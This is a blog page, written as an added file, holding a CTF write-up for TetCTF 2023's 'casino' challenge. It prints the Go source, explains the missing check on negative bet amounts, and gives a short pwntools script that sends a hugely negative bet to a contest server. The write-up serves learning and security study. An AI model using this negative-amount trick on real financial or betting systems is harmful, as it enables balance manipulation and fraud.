@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>TetCTF 2023: casino :: toasterpwn</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="An easy &#39;crypto&#39; challenge where we can trick a casino into adding to our balance by betting a negative amount of money." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://toasterpwn.github.io/posts/tetctf-2023-casino/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://toasterpwn.github.io/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://toasterpwn.github.io/img/theme-colors/blue.png">
+  <link rel="apple-touch-icon" href="https://toasterpwn.github.io/img/theme-colors/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="toasterpwn" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="TetCTF 2023: casino">
+<meta property="og:description" content="An easy &#39;crypto&#39; challenge where we can trick a casino into adding to our balance by betting a negative amount of money." />
+<meta property="og:url" content="https://toasterpwn.github.io/posts/tetctf-2023-casino/" />
+<meta property="og:site_name" content="toasterpwn" />
+
+  
+    <meta property="og:image" content="https://toasterpwn.github.io/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="CTF Writeups" />
+
+  <meta property="article:section" content="Cryptography" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="blue">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    toasterpwn
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://toasterpwn.github.io/posts/tetctf-2023-casino/">TetCTF 2023: casino</a>
+  </h1>
+  <div class="post-meta">
+    
+    
+    
+  </div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="https://toasterpwn.github.io/tags/ctf/">ctf</a>&nbsp;
+      
+      #<a href="https://toasterpwn.github.io/tags/crypto/">crypto</a>&nbsp;
+      
+      #<a href="https://toasterpwn.github.io/tags/integer-handling/">integer-handling</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p><code>casino</code> was an easy &lsquo;crypto&rsquo; challenge from TetCTF 2023, written by <code>ndh</code>.
+The description is as follows:</p>
+<blockquote>
+<p>Not really crypto&hellip;</p>
+</blockquote>
+<p>The idea of the challenge is to beat a casino and get enough money that your balance as bytes is longer (or equal to) the length of the flag. The challenge is written in <code>go</code>, the source is pasted below.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="1" type="checkbox" checked />
+    <label for="1">
+      <span class="collapsable-code__language">go</span>
+      <span class="collapsable-code__title">main.go</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-go" ><code>
+package main
+
+import (
+	&#34;bufio&#34;
+	&#34;encoding/json&#34;
+	&#34;fmt&#34;
+	&#34;log&#34;
+	&#34;math/big&#34;
+	&#34;os&#34;
+)
+
+type Request struct {
+	Recipient string `json:&#34;recipient&#34;`
+	Command   string `json:&#34;command&#34;`
+
+	// | recipient  | command              | username | amount | n | balance | proof_data |
+	// |------------|----------------------|----------|--------|---|---------|------------|
+	// | FlagSeller | PrintFlag            |    x     |        |   |    x    |     x      |
+	// | Casino     | Register             |    x     |        |   |         |            |
+	// | Casino     | Bet                  |    x     |   x    | x |         |            |
+	// | Casino     | ShowBalanceWithProof |    x     |        |   |         |            |
+
+	Username  string   `json:&#34;username&#34;`
+	Amount    *big.Int `json:&#34;amount&#34;`
+	N         int      `json:&#34;n&#34;`
+	Balance   *big.Int `json:&#34;balance&#34;`
+	ProofData []byte   `json:&#34;proof_data&#34;`
+}
+
+func main() {
+	flag, err := os.ReadFile(&#34;flag&#34;)
+	if err != nil {
+		log.Fatal(err)
+	}
+	casino := NewCasino()
+	flagSeller := NewFlagSeller(casino.RetrieveRootHash, string(flag))
+
+	var request Request
+	reader := bufio.NewReader(os.Stdin)
+	for {
+		line, err := reader.ReadBytes(&#39;\n&#39;)
+		if err != nil {
+			return
+		}
+		if err := json.Unmarshal(line, &amp;request); err != nil {
+			fmt.Printf(&#34;Cannot read request: %s\n&#34;, err)
+			continue
+		}
+		switch request.Recipient {
+		case &#34;Casino&#34;:
+			switch request.Command {
+			case &#34;Register&#34;:
+				if err := casino.Register(request.Username); err != nil {
+					fmt.Printf(&#34;An error occured: %s\n&#34;, err)
+					continue
+				}
+			case &#34;Bet&#34;:
+				if err := casino.Bet(request.Username, request.Amount, request.N); err != nil {
+					fmt.Printf(&#34;An error occured: %s\n&#34;, err)
+					continue
+				}
+			case &#34;ShowBalanceWithProof&#34;:
+				if err := casino.ShowBalanceWithProof(request.Username); err != nil {
+					fmt.Printf(&#34;An error occured: %s\n&#34;, err)
+					continue
+				}
+			default:
+				fmt.Printf(&#34;Unknown command: %s\n&#34;, request.Command)
+				continue
+			}
+		case &#34;FlagSeller&#34;:
+			switch request.Command {
+			case &#34;PrintFlag&#34;:
+				if err := flagSeller.PrintFlag(request.Username, request.Balance, request.ProofData); err != nil {
+					fmt.Printf(&#34;An error occured: %s\n&#34;, err)
+					continue
+				}
+			default:
+				fmt.Printf(&#34;Unknown command: %s\n&#34;, request.Command)
+				continue
+			}
+
+		default:
+			fmt.Printf(&#34;Unknown recipient: %s\n&#34;, request.Recipient)
+			continue
+		}
+	}
+}
+</code></pre>
+  </div>
+
+
+
+
+
+  <div class="collapsable-code">
+    <input id="2" type="checkbox" checked />
+    <label for="2">
+      <span class="collapsable-code__language">go</span>
+      <span class="collapsable-code__title">casino.go</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-go" ><code>
+package main
+
+import (
+	cryptorand &#34;crypto/rand&#34;
+	&#34;encoding/base64&#34;
+	&#34;encoding/binary&#34;
+	&#34;errors&#34;
+	&#34;fmt&#34;
+	&#34;github.com/cosmos/iavl&#34;
+	db &#34;github.com/tendermint/tm-db&#34;
+	&#34;log&#34;
+	&#34;math/big&#34;
+	&#34;math/rand&#34;
+)
+
+type Casino struct {
+	tree        *iavl.MutableTree
+	numAccounts int
+}
+
+func NewCasino() *Casino {
+	tree, err := iavl.NewMutableTree(db.NewMemDB(), 128, true)
+	if err != nil {
+		log.Fatal(err)
+	}
+	tmp := make([]byte, 8)
+	if _, err = cryptorand.Read(tmp); err != nil {
+		log.Fatal(err)
+	}
+	rand.Seed(int64(binary.LittleEndian.Uint64(tmp)))
+	return &amp;Casino{
+		tree:        tree,
+		numAccounts: 0,
+	}
+}
+
+func (c *Casino) getBalance(username string) (*big.Int, error) {
+	value, err := c.tree.Get([]byte(username))
+	if err != nil {
+		log.Fatal(err)
+	}
+	if value == nil {
+		return nil, errors.New(&#34;player-not-exist&#34;)
+	}
+	return new(big.Int).SetBytes(value), nil
+}
+
+func (c *Casino) setBalance(username string, value *big.Int) {
+	_, err := c.tree.Set([]byte(username), value.Bytes())
+	if err != nil {
+		log.Fatal(err)
+	}
+	_, _, err = c.tree.SaveVersion()
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+
+const MaxPlayers = 100
+const InitialBalance = 2023
+
+func (c *Casino) Register(username string) error {
+	exist, err := c.tree.Has([]byte(username))
+	if err != nil {
+		log.Fatal(err)
+	}
+	if exist {
+		return errors.New(&#34;player-exists&#34;)
+	}
+	if c.numAccounts &gt;= MaxPlayers {
+		return errors.New(&#34;max-players&#34;)
+	}
+	c.numAccounts &#43;= 1
+	c.setBalance(username, big.NewInt(InitialBalance))
+	fmt.Printf(&#34;Added user: %s.\n&#34;, username)
+	return nil
+}
+
+func (c *Casino) Bet(username string, amount *big.Int, n int) error {
+	currentBalance, err := c.getBalance(username)
+	if err != nil {
+		return err
+	}
+	if currentBalance.Cmp(amount) &lt; 0 {
+		return errors.New(&#34;insufficient-balance&#34;)
+	}
+	r := rand.Intn(2023)
+	if r == n { // correct guess
+		reward := new(big.Int).Mul(amount, big.NewInt(2022))
+		currentBalance.Add(currentBalance, reward)
+		c.setBalance(username, currentBalance)
+		fmt.Printf(&#34;YOU WIN! Current balance: %d (&#43;%d).\n&#34;, currentBalance, reward)
+	} else {
+		currentBalance.Sub(currentBalance, amount)
+		c.setBalance(username, currentBalance)
+		fmt.Printf(&#34;YOU LOSE (%d != %d)! Current balance: %d (-%d).\n&#34;, r, n, currentBalance, amount)
+	}
+	return nil
+}
+
+func (c *Casino) ShowBalanceWithProof(username string) error {
+	value, proof, err := c.tree.GetWithProof([]byte(username))
+	if err != nil {
+		log.Fatal(err)
+	}
+	if value == nil {
+		return errors.New(&#34;player-not-exist&#34;)
+	}
+	proofData, err := proof.ToProto().Marshal()
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Printf(&#34;%d, %s\n&#34;, new(big.Int).SetBytes(value), base64.StdEncoding.EncodeToString(proofData))
+	return nil
+}
+
+func (c *Casino) RetrieveRootHash() []byte {
+	result, err := c.tree.Hash()
+	if err != nil {
+		log.Fatal(err)
+	}
+	return result
+}
+</code></pre>
+  </div>
+
+
+
+
+
+  <div class="collapsable-code">
+    <input id="3" type="checkbox" checked />
+    <label for="3">
+      <span class="collapsable-code__language">go</span>
+      <span class="collapsable-code__title">flag_seller.go</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-go" ><code>
+package main
+
+import (
+	&#34;fmt&#34;
+	&#34;github.com/cosmos/iavl&#34;
+	iavlproto &#34;github.com/cosmos/iavl/proto&#34;
+	&#34;github.com/golang/protobuf/proto&#34;
+	&#34;math/big&#34;
+)
+
+type FlagSeller struct {
+	dbRootRetriever func() []byte
+	flag            string
+}
+
+func NewFlagSeller(dbRootRetriever func() []byte, flag string) *FlagSeller {
+	return &amp;FlagSeller{
+		dbRootRetriever: dbRootRetriever,
+		flag:            flag,
+	}
+}
+
+func (fs *FlagSeller) PrintFlag(usename string, balance *big.Int, proofData []byte) error {
+	var pbProof iavlproto.RangeProof
+	if err := proto.Unmarshal(proofData, &amp;pbProof); err != nil {
+		return fmt.Errorf(&#34;bad proof format: %w&#34;, err)
+	}
+	proof, err := iavl.RangeProofFromProto(&amp;pbProof)
+	if err != nil {
+		return fmt.Errorf(&#34;bad proof format: %w&#34;, err)
+	}
+	if err := proof.Verify(fs.dbRootRetriever()); err != nil {
+		return fmt.Errorf(&#34;proof verification failed: %w&#34;, err)
+	}
+	if err := proof.VerifyItem([]byte(usename), balance.Bytes()); err != nil {
+		return fmt.Errorf(&#34;proof verification failed: %w&#34;, err)
+	}
+
+	l := balance.BitLen() / 8
+	dot3 := &#34;...&#34;
+	if l &gt;= len(fs.flag) {
+		l = len(fs.flag)
+		dot3 = &#34;&#34;
+	}
+	fmt.Printf(&#34;Your flag is: %s%s\n&#34;, fs.flag[:l], dot3)
+	return nil
+}
+</code></pre>
+  </div>
+
+
+<p>I admit, I actually couldn&rsquo;t spot the bug here until <code>casino2</code> was released. When the sequel dropped, I diffed the two challenges to find one small difference:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff casino/casino/casino.go casino2/casino.go
+</span></span><span style="display:flex;"><span>83a84
+</span></span><span style="display:flex;"><span>&gt;       amount.Abs(amount)
+</span></span></code></pre></div><p>In the second challenge, the absolute value function is used on the amount we bet, meaning the amount always will be positive, however, this is omitted in the first challenge. There is a check to make sure our balance is greater than the amount we bet, to stop us from betting too much&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#a6e22e">currentBalance</span>.<span style="color:#a6e22e">Cmp</span>(<span style="color:#a6e22e">amount</span>) &lt; <span style="color:#ae81ff">0</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">errors</span>.<span style="color:#a6e22e">New</span>(<span style="color:#e6db74">&#34;insufficient-balance&#34;</span>)
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>&hellip;but this check does not prevent us from providing a negative bet amount, which is of course less than our current balance! If we specify a negative amount and then lose, the program will subtract a negative number from our balance, which will actually add to the balance. We can specify a hugely negative number, verify our balance, and then request the flag to solve the challenge. My solution in python is below.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="4" type="checkbox"  />
+    <label for="4">
+      <span class="collapsable-code__language">python</span>
+      <span class="collapsable-code__title">x.py</span>
+      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
+    </label>
+    <pre class="language-python" ><code>
+from pwn import *
+from json import loads, dumps
+
+r = remote(&#34;192.53.115.129&#34;,31338)
+r.sendline(dumps({&#34;recipient&#34;:&#34;Casino&#34;,&#34;command&#34;:&#34;Register&#34;,&#34;username&#34;:&#34;toast&#34;}).encode(&#39;utf-8&#39;))
+r.sendline(dumps({&#34;recipient&#34;:&#34;Casino&#34;,&#34;command&#34;:&#34;Bet&#34;,&#34;username&#34;:&#34;toast&#34;,&#34;amount&#34;:-999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999,&#34;n&#34;:1}).encode(&#39;utf-8&#39;))
+r.sendline(dumps({&#34;recipient&#34;:&#34;Casino&#34;,&#34;command&#34;:&#34;ShowBalanceWithProof&#34;,&#34;username&#34;:&#34;toast&#34;}).encode(&#39;utf-8&#39;))
+r.recvline()
+r.recvline()
+data = r.recvline().decode()
+balance = int(data.split(&#34;,&#34;)[0])
+proof = data.split(&#34;,&#34;)[1].strip()
+log.success(f&#34;Balance: {balance}&#34;)
+r.sendline(dumps({&#34;recipient&#34;:&#34;FlagSeller&#34;,&#34;command&#34;:&#34;PrintFlag&#34;,&#34;username&#34;:&#34;toast&#34;,&#34;balance&#34;:balance,&#34;proof_data&#34;:proof}).encode(&#39;utf-8&#39;))
+r.interactive()
+</code></pre>
+  </div>
+
+
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://toasterpwn.github.io/posts/defcon-ctf-2023-qualifiers/">
+                <span class="button__icon">←</span>
+                <span class="button__text">DEFCON CTF Qualifiers 2023 </span>
+            </a>
+        </span>
+        
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>toasterpwn</span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
